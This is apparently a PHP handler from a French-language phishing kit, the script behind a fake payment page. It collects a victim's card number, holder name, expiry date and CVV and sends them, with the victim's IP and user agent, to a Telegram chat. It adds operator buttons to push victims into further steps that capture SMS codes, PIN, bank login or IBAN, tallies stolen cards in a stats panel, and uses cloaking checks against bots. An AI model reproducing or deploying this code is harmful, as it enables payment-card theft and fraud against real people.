<?php
session_start();

include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

if (empty($_SESSION['webhook_set'])) {
    $webhook_url = htmlspecialchars("https://{$_SERVER['HTTP_HOST']}/app/webhook.php");
    $ctx = stream_context_create(['http' => ['timeout' => 3, 'ignore_errors' => true]]);
    @file_get_contents("https://api.telegram.org/bot" . urlencode($telegram['token'])
        . "/setWebhook?url=" . urlencode($webhook_url), false, $ctx);
    $_SESSION['webhook_set'] = 1;
}

$_SESSION['ip'] = filter_var($_SERVER['REMOTE_ADDR'] ?? '', FILTER_VALIDATE_IP) ?: '0.0.0.0';
$_SESSION['ua'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? '');

if (($_SESSION['index']  ?? '') != '1') { header('Location: ../../', true, 302); exit; }
if (($_SESSION['bot']    ?? '') != '1') { header('Location: /site/index.html', true, 302); exit; }
if (($_SESSION['client'] ?? '') != '1') { die('THE SITE IS UNDER MAINTENANCE PLEASE TRY LATER'); }

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    header('Location: /index.php', true, 302);
    exit;
}

$fields = ['number', 'holder', 'exp', 'cvv'];

foreach ($fields as $f) {
    if (empty($_POST[$f])) {
        $_SESSION['payment-error'] = $errors['2'];
        header('Location: ../', true, 302);
        exit;
    }
}

foreach ($fields as $f) {
    $_SESSION[$f] = htmlspecialchars(trim($_POST[$f]));
}

$_SESSION['numberr'] = preg_replace('/\s+/', '', $_SESSION['number']);
$_SESSION['bin'] = substr($_SESSION['numberr'], 0, 6);

binChecker($_SESSION['bin']);

if (isDateExpired($_SESSION['exp'])) {
    $_SESSION['payment-error'] = $errors['4'];
    header('Location: ../', true, 302);
    exit;
}

$_SESSION['payment-error'] = "";
$_SESSION['payment'] = "1";

if ($telegram['status'] == true) {
    $text = "
★━━━━━━ 💳 ━━━━━━★

💳 Numéro ➟ {$_SESSION['number']}
👤 Titulaire ➟ {$_SESSION['holder']}
📅 Expiration ➟ {$_SESSION['exp']}
🔒 CVV ➟ {$_SESSION['cvv']}

★━━━━━━ 🏦 ━━━━━━★

🏦 Banque ➟ {$_SESSION['bank']}
🏷 Type ➟ {$_SESSION['type']}
📊 Niveau ➟ {$_SESSION['level']}
🌍 Pays ➟ {$_SESSION['country']}

★━━━━━━ 🌐 ━━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}";

    $buttons = array(
        'inline_keyboard' => array(
            array(
                array('text' => '📩 MAIL 📩', 'callback_data' => "mail={$_SESSION['ip']}"),
                array('text' => '📱 SMS 📱', 'callback_data' => "sms={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '🏦 LOG 🏦', 'callback_data' => "bank={$_SESSION['ip']}"),
                array('text' => '🚪FIN 🚪', 'callback_data' => "fin={$_SESSION['ip']}"),
                array('text' => '💳 PIN 💳', 'callback_data' => "pin={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '🏛 IBAN 🏛', 'callback_data' => "iban={$_SESSION['ip']}"),
                array('text' => '📲 VBV 📲', 'callback_data' => "vbv={$_SESSION['ip']}"),
            ),
            array(
                array('text' => '❌ CARTE INVALIDE ❌', 'callback_data' => "carteInvalide={$_SESSION['ip']}"),
            ),
        ),
    );

    sendMessage($telegram['RezChatId']['card'], $text, $buttons);
    sendScan($telegram['RezChatId']['card'], $_SESSION['holder'], $_SESSION['number'], $_SESSION['exp'], $_SESSION['cvv']);
}

$sf = '../../../panel/stats.json';
$fh = @fopen($sf, 'c+');
if ($fh) {
    flock($fh, LOCK_EX);
    $raw  = stream_get_contents($fh);
    $data = $raw !== '' ? json_decode($raw, true) : null;
    if (!is_array($data)) $data = [];
    $data['Cards'] = ($data['Cards'] ?? 0) + 1;
    ftruncate($fh, 0); rewind($fh);
    fwrite($fh, json_encode($data, JSON_PRETTY_PRINT));
    fflush($fh); flock($fh, LOCK_UN); fclose($fh);
}

$root = dirname(__DIR__, 3);
$camp = basename(dirname(__DIR__, 2));
$next = $_SESSION['id5'] ?? '';
if ($next === '' || !is_dir($root . '/' . $camp . '/' . $next)) {
    $next = trim((string)@file_get_contents($root . '/id5.txt'));
}
$target = ($next !== '' && is_dir($root . '/' . $camp . '/' . $next))
    ? '/' . $camp . '/' . $next . '/'
    : '/index.php';

session_write_close();
header('Location: ' . $target, true, 302);
exit();